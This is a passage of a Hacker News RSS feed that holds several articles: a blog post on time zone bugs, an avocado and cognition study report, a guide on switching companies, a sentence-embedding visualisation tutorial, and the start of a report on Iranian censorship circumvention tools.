<p>In 2015, Chile decided to move from seasonal DST to permanent DST, and some JRE releases included this change. But then, in 2016 Chile decided to revert to how it was before; seasonal DST instead of permanent. <strong>What was the issue?</strong> The app was using one of these JRE releases with an outdated time zone data file.</p>
<p>You can read more about these <a target="_blank" href="https://hi.service-now.com/kb_view.do?sysparm_article=KB0622033">DST issues with Java here</a>.</p>

<h2 id="time-zone-of-your-server">Time zone of your server</h2>
<p>The operative system defines your server's time zone. I've always used Linux for production servers, and they come with UTC as the default time zone.</p>
<p>If you need to change this time zone, make sure to do it before your application starts or it won't reflect the change.</p>
<h3 id="the-bug-app-using-the-wrong-default-time-zone-from-the-server">The bug - App using the wrong default time zone from the server</h3>
<p>I was migrating some processes in our build and deployment pipeline. From configuring the app with every deploy to a pre-built AWS Amazon Machine Image (AMI) with HashiCorp's Packer.</p>
<p>One step of the initial configuration was to change the server's time zone to America/Mexico_City, and I was aware of it. So I created a bash script that changed the time zone on the AMI we were going to use. The script worked well when I tested it on a Linux instance. No problem there.</p>
<p>I proceeded to use this AMI in our staging environment and neither I nor my teammates noticed something off. So, to production!</p>
<p>Customer's questions and complaints about dates behaving weird arrived minutes later üò•</p>
<p><strong>The issue?</strong> The script that updated the server's time zone was failing silently and I missed double-checking it in the staging environment. The app wasn't using an explicit time zone, so it took the server's. And the server's time zone was UTC by default, and we needed America/Mexico_City. I fixed the script and, to make sure, updated the app's default time zone to the expected one.</p>

<h2 id="time-zone-of-your-database">Time zone of your database</h2>
<p>You can also change your database's time zone. I use AWS Relational Database Service (RDS) and the default time zone is UTC. You can update it from the parameter group of your cluster or individual instance.</p>
<h3 id="the-bug-wrong-database-time-zone">The bug - Wrong database time zone</h3>
<p>Now I was doing a migration of our database. I anticipated myself by changing the database's time zone to America/Mexico_City because the app and server had it. Every part of the system should be in the same page, right? <strong>Wrong!</strong></p>
<p>The database was perfectly okay being in UTC while the app and server were in America/Mexico_City. That's how it worked. </p>
<p>This bug was not as critical as the previous ones because I caught it in our staging environment. </p>

<h2 id="time-zone-of-your-users">Time zone of your users</h2>
<p>If it wasn't enough, each one of your users can have a different time zone, and you have to take that into consideration when showing time sensitive-data.</p>
<h3 id="the-bug-many-of-them">The bug - Many of them!</h3>
<p>I've encountered many bugs related to user's time zones:</p>
<ul>
<li>Missing time zone in date formatter.</li>
<li>Incorrect time zone selection from the user.</li>
<li>Missing DST time zone options for users to select.</li>
<li>Storing dates with time zone modifications that get parsed again when retrieved.</li>
</ul>
<hr>
<p>Time zones are one of the most complicated topics you'll find while developing software. They're complex by themselves, and even more when you throw some code into the mix.</p>
<p>I hope these short stories can help you avoid my mistakes in the future üôåüèº</p>
<p><strong>Thanks for reading me! üíô</strong></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.davidojeda.dev/4-time-zone-bugs-i-ran-into</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586991</guid>
            <pubDate>Fri, 25 Sep 2020 06:01:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Avocado a Day Keeps the Neurologist Away]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586974">thread link</a>) | @whereistimbo
<br/>
September 24, 2020 | https://legacyneuro.com/avocado-day-keeps-neurologist-away/ | <a href="https://web.archive.org/web/*/https://legacyneuro.com/avocado-day-keeps-neurologist-away/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                                                <article id="post-2389">
                                <p><time datetime="2017-08-25T07:20:23-05:00">Aug                                        <strong>25</strong></time>
                                    
                                </p>
                                <div>
                                    

                                    <div>
                                        <div>
<h4>Tufts University has released results of a study linking eating avocados to helping improve cognitive brain function</h4>
<p>The study reveals an link to ‚Äúeating avocados to helping improve cognitive brain function in older adults, news especially relevant to Hispanics who have been found to have the longest life expectancy rate in the U.S. Published in the journal Nutrients and supported by the USDA and the Hass Avocado Board, the research tracked how 40 healthy adults ages 50 and over who ate one fresh avocado a day for six months experienced a 25 percent increase in lutein levels in their eyes and significantly improved working memory and problem-solving skills.</p>

<p>Lutein is a type of carotenoid antioxidant, or pigment, commonly found in fruits and vegetables already widely accepted to have a role in preserving eye health and now increasingly thought to have a positive impact on brain health as well. As study participants incorporated one medium avocado into their daily diet, researchers monitored gradual growth in the amount of lutein in their eyes and progressive improvement in cognition skills as measured by tests designed to evaluate memory, processing speed and attention levels. In contrast, the control group, which did not eat avocados, experienced fewer improvements in cognitive health during the study period.</p>
<p>‚ÄúThe results of this study suggest that the monounsaturated fats, fiber, lutein and other bioactives make avocados particularly effective at enriching neural lutein levels, which may provide benefits for not only eye health, but for brain health,‚Äù said Elizabeth Johnson, lead investigator of the study from the Jean Mayer USDA Human Nutrition Research Center on Aging at Tufts University. ‚ÄúFurthermore, the results of this new research reveal that macular pigment density more than doubled in subjects that consumed fresh avocados, compared to a supplement, as evidenced by my previous published research. Thus, a balanced diet that includes fresh avocados may be an effective strategy for cognitive health.‚Äù</p>
<p>‚ÄúTuft‚Äôs findings that eating avocados is linked to a positive impact on memory is one more reason to enjoy healthy avocados daily. It‚Äôs especially good news for Hispanic households where avocados are already so popular and older generations are culturally central to the core family unit,‚Äù said Emiliano Escobedo, executive director of the Hass Avocado Board. ‚ÄúMore research is needed in different populations with different amounts of avocado to better understand the connection between avocados and brain health.‚Äù</p>
</div>

<p>&nbsp;‚ÄúAn Avocado a Day Keeps the Neurologist Away.‚Äù&nbsp;<i>The Produce News ‚Äì Covering Fresh Produce around the Globe since 1897.</i>&nbsp;The Produce News, 24 Aug. 2017. Web. 25 Aug. 2017.</p>

<p>The article can be found <a href="http://producenews.com/category-list/22124-an-avocado-a-day-keeps-the-neurologist-away">here</a></p>
                                    </div>

                                    
                                </div>
                            </article>
                                        </div>

                

            </div></div>]]>
            </description>
            <link>https://legacyneuro.com/avocado-day-keeps-neurologist-away/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586974</guid>
            <pubDate>Fri, 25 Sep 2020 05:59:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Covert Acoustical Mesh Networks in Air (2013)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586794">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | http://www.jocm.us/index.php?m=content&c=index&a=show&catid=124&id=600 | <a href="https://web.archive.org/web/*/http://www.jocm.us/index.php?m=content&c=index&a=show&catid=124&id=600">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                          <div>
                          <div>
                          <p><img src="http://www.jocm.us/statics/images//images/p.jpg" alt=""></p>                          <!--<div class="about-more"><a href="#"><i class="fa fa-hand-o-right"></i><span style="font-size:14px;">Online First
</span></a></div>-->
                          </div>
<div>
<p>Journal of Communications&nbsp;</p><p>
Welcome to the website of the Journal of Communications. JCM is a scholarly peer-reviewed international scientific journal published monthly, focusing on theories, systems, methods, algorithms and applications in communications. It provide a high profile, leading edge forum for academic researchers, industrial professionals, engineers, consultants, managers, educators and policy makers working in the field to contribute and disseminate innovative new work on communications.&nbsp;All papers will be blind reviewed and accepted papers will be published monthly which is available online (<a href="http://www.jocm.us/index.php?m=content&amp;c=index&amp;a=lists&amp;catid=99">open access</a>) and in printed version.</p><!--<div class="about-more" style="float:right; margin-right:10px;"><a href="http://www.ijmerr.com/list-9-1.html"><i class="fa fa-question-circle-o"></i><span style="font-size:14px;">All Issues
</span></a></div>-->
</div>

                        </div>
                     </div></div>]]>
            </description>
            <link>http://www.jocm.us/index.php?m=content&amp;c=index&amp;a=show&amp;catid=124&amp;id=600</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586794</guid>
            <pubDate>Fri, 25 Sep 2020 05:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deciding to Switch Companies]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586217">thread link</a>) | @rustoo
<br/>
September 24, 2020 | https://staffeng.com/guides/deciding-to-switch | <a href="https://web.archive.org/web/*/https://staffeng.com/guides/deciding-to-switch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h4><a href="https://staffeng.com/guides">Guides</a> / <a href="https://staffeng.com/guides/deciding-to-switch">Deciding to switch companies</a></h4><div><p>My father was a professor of economics. After he completed his PhD in his late twenties, he started teaching at one university, got tenure at that university, and walked out forty-some years later into retirement. Working in technology, that sounds like a fairytale.</p>
<p>There are very few software companies with a forty-year track record, and even fewer folks whose <a href="https://lethain.com/forty-year-career/">forty-year career</a> consisted of one employer. There used to be a meme that many engineers spent either one or four years at each company to maximize their equity grants and then bounced on to the next. If that ever happened, it certainly isn‚Äôt common behavior for folks who aspire towards or reach Staff-plus roles.</p>
<p>Instead, generally those folks stay, and are rewarded for staying, at a given company as long as the circumstances support their success. If those circumstances change, they tend to either leave shortly thereafter or spend a while burning out and then leave after exhausting their emotional reservoir.</p>
<p>It takes years to build the visibility and social credibility to get promoted from a Senior Engineer role to a Staff-plus role, which makes it very difficult to walk away if you feel like you‚Äôre <em>just</em> one hump away from the promotion. Leaving, it can feel like, means starting over from scratch.</p>
<p>Then again, as described by <a href="https://staffeng.com/stories/duretti-hirpa">Duretti Hirpa</a> and <a href="https://staffeng.com/stories/keavy-mcminn">Keavy McMinn</a>, it‚Äôs common for folks to attain their first Staff-plus title by joining a new company. Even with all your internal credibility, sometimes leaving is the most effective path forward.</p>
<p>What‚Äôs the right decision for you?</p>
<hr>
<p>Before going further, I want to recognize two very different job-switching experiences: one of privileged flexibility and another of rigid constraints. Your residency might depend on a work-sponsored visa. You might be supporting an extended family. You might be constrained to a geographical area with few employers. This advice focuses on the former circumstances, which are more common circumstances for someone who‚Äôs deep enough into a technology career to pursue a Staff role. You should absolutely discount it to the extent this doesn‚Äôt reflect your circumstances.</p>
<h2>Why leaving works</h2>
<p>The company that knows your strengths the best is your current company, and they are the company most likely to give you a Staff-plus role. However, actually awarding the role depends on so many circumstantial concerns, that this isn‚Äôt how it works out in practice.</p>
<p>If your current team is very senior, it may be hard to justify your impact at the Staff engineer level because it‚Äôs being attributed to your peers. Your manager might have a limited budget that doesn‚Äôt have room for another Staff engineer. You might lack an internal sponsor. There simply might not be the need for an additional Staff engineer at your company. Any of these can mean that while you ought to be promoted, your current company won‚Äôt.</p>
<p>Conversely, when you interview for new roles, you can simply keep interviewing until you find a company that‚Äôs able to grant the title. The interview process often brings an automatic sponsor with it -- the hiring manager -- whose incentives will never be more aligned with yours than in the interview process.</p>
<p>The technical interviews are an inconsistent and unreliable predictor of success, which is bad for the industry and bad for companies, but works in your favor if you‚Äôre set on attaining a Staff-plus role and are willing to conduct a broad search. Interviewing creates the opportunity to play ‚Äúbias arbitrage‚Äù, finding a company that values your particular brand of bullshit disproportionately. That might be a company that values folks with conference speaking visibility, your experience designing APIs, or <a href="https://staffeng.com/stories/dmitry-petrashko">your PhD thesis on compilers</a>.</p>
<p>Similarly, sometimes you‚Äôll get into a rut at a company where your reputation is preventing forward progress. Perhaps you‚Äôve tagged ‚Äúdifficult‚Äù after flagging inclusion issues. Maybe you embarrassed an influential Director at lunch and they‚Äôre blocking your promotion. A new company lets you leave that baggage behind.</p>
<hr>
<p>Yeah, of course, it‚Äôs always an open question whether you can <em>really</em> leave anything behind you in the tech industry. It can feel a bit cliquey at times. If you‚Äôve worked in tech hubs, at larger companies, and for more than ten years, then you almost certainly have mutual connections with the folks interviewing you.</p>
<p>If you have a bad run at a company, maybe your manager was a bully or maybe you were going through a challenging period in your own life, it can feel like a cloud poisoning your future prospects. That said, much like the interview process in general, references and backchannel reference checks are deeply random. If you need any further evidence of that, look to the serial harassers who continue to get hired job after job at prominent companies.</p>
<h2>Things to try before leaving</h2>
<p>If you‚Äôre planning to leave due to lack of interest, excitement, support or opportunity, it‚Äôs worthwhile to at least explore the internal waters first. This lets you carry your internal network with you while still getting many of the advantages of switching companies. Depending on your company‚Äôs size and growth rate this might not be an option for you, but there are some folks who switch roles every two-to-three years within the same parent company, and find that an effective way to remain engaged and learning.</p>
<p>On the other hand, if you‚Äôre considering leaving due to burnout or exhaustion, it‚Äôs sometimes possible to negotiate a paid or unpaid sabbatical where you can take a few months recharging yourself, often in conjunction with switching internal roles. This is more common at larger companies. (In case you were wondering, no your coworkers taking parental leave is not ‚Äúon sabbatical‚Äù or ‚Äúon vacation.‚Äù)</p>
<h2>Leaving without a job</h2>
<p>Speaking of burnout, if you‚Äôre <em>particularly</em> burned out, it‚Äôs worth considering leaving your job without another job lined up. There‚Äôs a fairly simple checklist to determine if this is a good option for you:</p>
<ul>
<li>Does your visa support this?</li>
<li>Are you financially secure for at least a year without working?</li>
<li>Do you work in a high-density job market, remotely, or are you flexible on where your next job is?</li>
<li>Do you interview well?</li>
<li>Could you articulate a coherent narrative to someone asking you why you left without a job lined up?</li>
<li>Are there folks at your previous company who can provide positive references?</li>
</ul>
<p>If all of those are true, then I don‚Äôt know anyone who <em>regrets</em> taking a sabbatical. However, bear in mind that it‚Äôs only the folks who took six-month-plus sabbaticals who felt reborn by the experience. Folks taking shorter stints have appreciated them but often come back only partially restored.</p>
<h2>Taking the plunge</h2>
<p>If you‚Äôre almost at the Staff promotion in your current company, there is absolutely another company out there who will give you the Staff title. Whether or not you‚Äôll enjoy working there or be supported after getting there, that‚Äôs a lot harder to predetermine. If your internal reputation is damaged or if you‚Äôve been repeatedly on the cusp of promotion but victim to a moving criteria line, then you should seriously consider switching roles if the title is important to you -- at some point you have to hear what your current company is telling you.</p>
<p>Conversely, if you‚Äôre happy in your current role outside of the title, consider if you can be more intentional about pursuing your promotion rather than leaving. Many folks hit a rut in their promotion path to Staff-plus, and using techniques like the <a href="https://staffeng.com/guides/promo-packets">promotion packet</a> can help you get unstuck. If you‚Äôve used all the approaches, taken your self-development seriously, and still can‚Äôt get there -- it‚Äôs probably time to change.</p>
<p>That said, it‚Äôs easy to overthink these things. Few folks tell their decade-past story of staying at or leaving some job.</p></div><p><em><a href="https://staffeng.com/guides">Read another guide?</a></em> <!-- -->or<!-- --> <em><a href="https://staffeng.com/stories">Back to the stories?</a></em></p></section></div></div>]]>
            </description>
            <link>https://staffeng.com/guides/deciding-to-switch</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586217</guid>
            <pubDate>Fri, 25 Sep 2020 03:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interactive Analysis of Sentence Embeddings]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24586043">thread link</a>) | @amitness
<br/>
September 24, 2020 | https://amitness.com/interactive-sentence-embeddings/ | <a href="https://web.archive.org/web/*/https://amitness.com/interactive-sentence-embeddings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p><a href="https://projector.tensorflow.org/">Embedding Projector</a> is a free web application for visualizing high-dimensional data. It has built-in demos for visualizing word embeddings in NLP and image embeddings for MNIST in Computer Vision.</p>
<p>I recently experimented with a way to load sentence embeddings along with the class labels into this tool and explore them interactively. In this blog post, I will explain the end-to-end process with an example dataset.</p>
<h2 id="toy-example-outlier-detection">Toy Example: Outlier Detection</h2>
<h3 id="1-preparing-dataset">1. Preparing Dataset</h3>
<p>To understand this use case, let‚Äôs take a subset of 100 movie reviews from the SST-2 dataset which are labeled as positive and negative.</p>
<div><div><pre><code><span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>read_csv</span><span>(</span><span>'http://bit.ly/dataset-sst2'</span><span>,</span> 
                 <span>nrows</span><span>=</span><span>100</span><span>,</span> <span>sep</span><span>=</span><span>'</span><span>\t</span><span>'</span><span>,</span> <span>names</span><span>=</span><span>[</span><span>'text'</span><span>,</span> <span>'label'</span><span>])</span>

<span>df</span><span>[</span><span>'label'</span><span>]</span> <span>=</span> <span>df</span><span>[</span><span>'label'</span><span>].</span><span>replace</span><span>({</span><span>0</span><span>:</span> <span>'negative'</span><span>,</span> <span>1</span><span>:</span> <span>'positive'</span><span>})</span>
</code></pre></div></div>
<p>The dataset has a column containing the text and a label indicating whether it‚Äôs positive or negative opinion.</p>
<p><img src="https://amitness.com/images/projector-head-5.png" alt=""></p>
<p>We will introduce label noise into our dataset by corrupting five of the responses with random text. It will act as an outlier for our example.</p>
<div><div><pre><code><span>df</span><span>.</span><span>loc</span><span>[[</span><span>10</span><span>,</span> <span>27</span><span>,</span> <span>54</span><span>,</span> <span>72</span><span>,</span> <span>91</span><span>],</span> <span>'text'</span><span>]</span> <span>=</span> <span>'askgkn askngk kagkasng'</span>
</code></pre></div></div>
<h3 id="2-generating-embeddings">2. Generating Embeddings</h3>
<p>Now, we will compute sentence embeddings for the headlines using the <code>sentence-transformers</code> package. First, let‚Äôs install it using pip.</p>
<div><div><pre><code><span>!</span>pip <span>install </span>sentence-transformers
</code></pre></div></div>
<p>Next, we will create a helper function to return a NumPy array of sentence embeddings given a list of sentences.</p>
<div><div><pre><code><span>from</span> <span>sentence_transformers</span> <span>import</span> <span>SentenceTransformer</span>

<span>sentence_bert_model</span> <span>=</span> <span>SentenceTransformer</span><span>(</span><span>'distilbert-base-nli-stsb-mean-tokens'</span><span>)</span>

<span>def</span> <span>get_embeddings</span><span>(</span><span>sentences</span><span>):</span>
    <span>return</span> <span>sentence_bert_model</span><span>.</span><span>encode</span><span>(</span><span>sentences</span><span>,</span>
                                    <span>batch_size</span><span>=</span><span>32</span><span>,</span> 
                                    <span>show_progress_bar</span><span>=</span><span>True</span><span>)</span>
</code></pre></div></div>
<p>Using the above function, we can generate sentence embeddings for our data as shown below.</p>
<div><div><pre><code><span>e</span> <span>=</span> <span>get_embeddings</span><span>(</span><span>df</span><span>[</span><span>'text'</span><span>])</span>
<span># shape: (100, 768)
</span></code></pre></div></div>
<h3 id="3-exporting-to-embedding-projector-format">3. Exporting to Embedding Projector Format</h3>
<p>Embedding Projector requires two TSV files to load our custom embeddings.</p>
<ul>
<li><code>output.tsv</code>: This file should contain the embeddings without any headers.</li>
<li><code>metadata.tsv</code>: This file should contain the original text and labels for the embeddings</li>
</ul>
<p>Let‚Äôs first generate the <code>output.tsv</code> file for our sentence embeddings from the previous step.</p>
<div><div><pre><code><span># Convert NumPy array of embedding into data frame
</span><span>embedding_df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>(</span><span>e</span><span>)</span>

<span># Save dataframe as as TSV file without any index and header
</span><span>embedding_df</span><span>.</span><span>to_csv</span><span>(</span><span>'output.tsv'</span><span>,</span> <span>sep</span><span>=</span><span>'</span><span>\t</span><span>'</span><span>,</span> <span>index</span><span>=</span><span>None</span><span>,</span> <span>header</span><span>=</span><span>None</span><span>)</span>
</code></pre></div></div>
<p>To generate <code>metadata.csv</code>, we simply save our original dataframe.</p>
<div><div><pre><code><span># Save dataframe without any index
</span><span>df</span><span>.</span><span>to_csv</span><span>(</span><span>'metadata.tsv'</span><span>,</span> <span>index</span><span>=</span><span>False</span><span>,</span> <span>sep</span><span>=</span><span>'</span><span>\t</span><span>'</span><span>)</span>
</code></pre></div></div>
<h3 id="4-importing-into-embedding-projector">4. Importing into Embedding Projector</h3>
<p>We first go to <a href="https://projector.tensorflow.org/">https://projector.tensorflow.org/</a>.</p>
<p>On the left-hand sidebar, click the <strong>Load</strong> button.</p>
<p><img src="https://amitness.com/images/projector-load-step-1.png" alt=""></p>
<p>Then, for the first <strong>Choose file</strong> button, upload the <code>output.tsv</code> file and for the second <strong>Choose file</strong> button, upload the <code>metadata.tsv</code> file.</p>
<p><img src="https://amitness.com/images/projector-load-step-2.png" alt=""></p>
<p>After uploading both files, click outside and you should see the sentence embedding projection. The dimensions of embeddings are reduced to 3D by default using PCA.</p>
<p><img src="https://amitness.com/images/projector-3d.png" alt=""></p>
<p>Let‚Äôs switch to 2D by turning off the checkbox for ‚ÄòComponent #3‚Äô in the bottom part of sidebar.</p>
<p><img src="https://amitness.com/images/projector-turn-off-3d.png" alt=""></p>
<p>On the 2D visualization, we can see how the random text is far from other groups of text as an <strong>outlier</strong>. On hovering the point, we see the text <code>askgkn askngk kagkasng</code>.</p>
<p><img src="https://amitness.com/images/projector-outlier.gif" alt=""></p>
<h3 id="5-useful-features-in-projector">5. Useful Features in Projector</h3>
<h4 id="a-class-separation">a. Class Separation</h4>
<p>We can enable color coding of the points by their actual labels (positive vs negative) by using the <strong>Color by</strong> dropdown in the left sidebar.</p>
<p>Select the name of the column that contains your labels. In our example file, the column name is <strong>label</strong>.</p>
<p><img src="https://amitness.com/images/projector-color-code-labels.png" alt=""></p>
<p>The points themselves are interactive. You can see the actual sentence for each point by hovering over them.</p>
<p><img src="https://amitness.com/images/projector-interactive-1.gif" alt=""></p>
<p>You can click on the point to show the metadata. We can see below on clicking a blue point that its label is ‚Äúpositive‚Äù in the popup.</p>
<p>So the blue points are positive and the red points are negative. When a point is selected, 100 nearest points in terms of cosine similarity are also highlighted.</p>
<p><img src="https://amitness.com/images/projector-click-point.gif" alt=""></p>
<p>To get back to the original view, we can click on any empty white space.</p>
<div>
<h4>Applications</h4>
<p>The color coding can be a useful heuristic for many use cases:</p>
<ul>
<li>It can be used to explore class overlap for the dataset you're working on and identify tricky sentences.</li>
<li>If there are labeling errors in your dataset, then this might help uncover them. For example, if a whole cluster of points is in a certain color, but some single point in that cluster is in a different color, then that might be an outlier or labeling error.</li>
</ul>
</div>
<h4 id="b-dimensionality-reduction-algorithm">b. Dimensionality Reduction Algorithm</h4>
<p>The web app provides three standard dimensionality reduction techniques: <strong>UMAP</strong>, <strong>T-SNE</strong>, and <strong>PCA</strong>.</p>
<p>You can choose the algorithm and their parameters from the bottom of the left sidebar.</p>
<p><img src="https://amitness.com/images/projector-choose-dim-algorithm.png" alt=""></p>
<h4 id="c-custom-linear-projection">c. Custom Linear Projection</h4>
<p>You can also use a custom keyword or full text as the axis using the <strong>CUSTOM</strong> tab. This will apply a custom linear projection and can help us explore meaningful directions in the embedding space.</p>
<p><img src="https://amitness.com/images/projector-custom-dim.png" alt=""></p>
<p>For example, the Gmail team tried setting ‚Äúyeah‚Äù on the left side and ‚Äúyes‚Äù on the right side. When they projected encoder embeddings for email replies to this custom linear projection, they found replies in a casual tone (e.g. Here you go) on the left side and responses in a more formal tone clustered towards the right side.</p>
<p><img src="https://amitness.com/images/projector-custom-direction.png" alt=""></p>
<h2 id="conclusion">Conclusion</h2>
<p>Thus, Embedding Projector is a very useful tool to better understand the datasets and models we work with.</p>
<h2 id="references">References</h2>
<ul>
<li>Daniel Smilkov et al., <a href="https://arxiv.org/abs/1611.05469">Embedding Projector: Interactive Visualization and Interpretation of Embeddings</a></li>
</ul>
</section></div>]]>
            </description>
            <link>https://amitness.com/interactive-sentence-embeddings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24586043</guid>
            <pubDate>Fri, 25 Sep 2020 02:36:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Iranian diaspora is using old-school tech to fight internet shutdown at home]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585986">thread link</a>) | @rfreytag
<br/>
September 24, 2020 | https://restofworld.org/2020/cat-and-mouse-censorship/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cat-and-mouse-censorship/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>One November morning last year, Mehdi Yahyanejad listened to a voicemail in his Los Angeles office: ‚ÄúI‚Äôm contacting you from the city of Tehran,‚Äù said the voice. ‚ÄúThis was the first time I‚Äôve experienced an internet shutdown. ‚Ä¶ It feels like I‚Äôm in a prison.‚Äù</p>



<p>A few weeks earlier, Iran‚Äôs largest mobile networks and internet providers went offline. Amid weeks of growing anti-regime protests, Iranian authorities imposed <a href="https://edition.cnn.com/2019/11/18/middleeast/iran-protests-explained-intl/index.html">the longest internet shutdown</a> in the country‚Äôs history, effectively cutting off external communication for over 80 million Iranians. In an unprecedented crackdown, regime forces <a href="https://www.amnesty.org/en/latest/news/2020/05/iran-details-released-of-304-deaths-during-protests-six-months-after-security-forces-killing-spree/">killed more than 300 protesters</a> and arrested <a href="https://www.amnesty.org/en/latest/news/2019/12/iran-thousands-arbitrarily-detained-and-at-risk-of-torture-in-chilling-post-protest-crackdown/">over 7,000 people</a>. When access was finally restored on November 23, nearly half the country was still unable to come online.</p>



<p>Nine months after the November blackout, Iranians still live in fear of another all-out shutdown. As authorities tighten their hold on internet access, diaspora-led companies are filling the gap for Iranians who are seeking a way to bypass censors. The circumvention tools, created largely by diaspora entrepreneurs, are becoming increasingly critical as they face a crackdown at home and the bite of American-led sanctions online.</p>



<p>On November 15, as Iranian authorities first moved to induce the digital blackout, 44-year-old Yahyanejad raced against the clock in Los Angeles to make sure that people back home had downloaded his satellite file-casting application <a href="https://www.toosheh.org/">Toosheh</a>.<em> </em>‚ÄúIt was a very small window,‚Äù says Yahyanejad. ‚ÄúOnce they were fully disconnected, I wasn‚Äôt sure they‚Äôd be able to download the software.‚Äù&nbsp;</p>



<p>Launched by Yahyanejad in 2016, the technology aggregates uncensored content, like news articles, YouTube videos, and podcasts, and sends it to Iranian homes directly via satellite TV. When Yahyanejad first began developing Toosheh in 2013, an estimated 70% of Iranian households owned a satellite dish, while around 20% had access to the internet. Even as internet access has grown, state censorship means Toosheh‚Äôs satellite technology is a much more reliable source for uncensored content. Iranians can install Toosheh‚Äôs satellite channel and receive a daily dispatch in the form of a file package of up to 8 gigabytes. Once a user downloads the app, the satellite transfers circumvent the internet entirely.&nbsp;</p>



<p>Yahyanejad says Toosheh gained nearly 100,000 new Iranians users in November 2019. In the absence of an internet connection, it became the only way for many users to access news from the outside world. The voice on Toosheh‚Äôs voicemail belonged to one such user, a 34-year-old high school principal in Tehran who downloaded emergency VPN and proxy tools delivered to him through the satellite service.&nbsp;</p>



<p>Having navigated extensive cyber censorship for over a decade, Iranians are tech savvy and <a href="https://www.bbc.com/news/blogs-trending-42612546">adept at nimbly crossing firewalls</a>, using proxies and foreign circumvention tools. ‚ÄúIt‚Äôs a constant cat-and-mouse game,‚Äù says Fereidoon Bashar, executive director of ASL19, a Canadian organization working to help Iranians bypass internet censorship. The group often works in tandem with Yahyanejad to distribute proxy tools.&nbsp;</p>



<p>Bashar says Iranians adapt quickly to ever-changing institutionalized control online. But the last five years of Iranian president Hassan Rouhani‚Äôs rule have seen <a href="https://www.cnet.com/news/irans-president-plans-to-cut-countrys-internet-off-from-the-rest-of-the-world/">a tighter grip on internet connections</a>. Site blocking and calculated internet outages have become easier to enforce: the regime has reduced Iran‚Äôs dependence on global networks by pushing a local intranet, with the <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">aim to keep online traffic</a> inside the country. With strict American sanctions that threaten hefty fines for companies interfacing with Iran, foreign tech companies limit ordinary Iranians‚Äô ability to purchase reliable proxies <a href="https://www.wired.com/2016/09/how-iran-is-building-its-censorship-friendly-domestic-internet/">out of an abundance of caution</a>. Riddled with insecurity, the local VPN black market is not a reliable option for those trying to avoid government attention.</p>



<p>But even as internet access grew incrementally difficult over the years, no one saw the November blackout coming. ‚ÄúAn internet shutdown was previously viewed as a kind of dystopian political campaign,‚Äù says Kaveh Azarhoosh, an internet policy researcher. In November, the worst-case scenario for Iran‚Äôs censorship suddenly became a reality.&nbsp;&nbsp;</p>



<p>In the early days of the protest, Toosheh created a special ‚ÄúProtest News Package.‚Äù Every night, after aggregating content from over 200 publications, Toosheh delivered digital bundles containing clips of protests occuring in different cities: Tabriz, Qom, Shiraz, Mashhad, and others. It also contained slides about how to stay safe during a protest; crucial news coverage from banned sites, like the <em>New York Times</em>, Voice of America Persian, and Deutsche Welle; and a curated compilation of tweets from Iranian politicians. These packages weren‚Äôt just bringing news of the outside world to Iran: they kept Iranians informed about what was happening inside their own country too.</p>



<p>Yahyanejad, a physicist by training, left Iran in 1997 to pursue a Ph.D. from the Massachusetts Institute of Technology. ‚ÄúI‚Äôve lived in Iran, and I‚Äôve gone to school and college there,‚Äù he explains. ‚ÄúI know that this repressive government exists because they are able to control the flow of information.‚Äù He says he‚Äôs always had an interest in limiting their control. ‚ÄúI want,‚Äù he says, ‚Äúto see democracy in Iran in my lifetime.‚Äù&nbsp;</p>



<p>In 2006, Yahyanejad launched a Reddit-like forum called <a href="https://www.balatarin.com/">Balatarin</a>. ‚ÄúIts popularity surprised me,‚Äù he says. The site posted a translated rumor about the supreme leader‚Äôs death, after he hadn‚Äôt been seen in public for two months, and was swiftly blocked by Iran shortly after. The moment was a turning point for Yahyanejad, who says, ‚ÄúI made a conscious decision to keep the platform open at a personal cost.‚Äù&nbsp;</p>



<p>The Iranian blocks on Balatarin inspired Yahyanejad to explore censorship circumvention. He launched the satellite app Toosheh in 2016. ‚ÄúI <a href="https://www.youtube.com/watch?v=FWfwF8Gx6VA">went on BBC Persian‚Äôs ‚ÄòNewshour</a>,‚Äô and as soon as I talked about it, people started downloading and testing it immediately,‚Äù he says.&nbsp;</p>



<p>Yahyanjad finds himself among a cohort of diaspora Iranians working to fight the regime‚Äôs censors. ASL19, the Canadian technology group, collaborated with him to deliver proxy tools to over half a million Iranians during November‚Äôs shutdown. ASL19‚Äôs Bashar, who left Iran in the early 2000s before <a href="https://opennet.net/blog/2013/02/after-green-movement-internet-controls-iran-2009-2012">the tumultuous Green Movement</a>, says diaspora Iranians are stepping into the field because Iranians ‚Äúrisk harsh conditions, imprisonment, and long sentences‚Äù if they‚Äôre caught creating circumvention tools inside the country.&nbsp;&nbsp;</p>


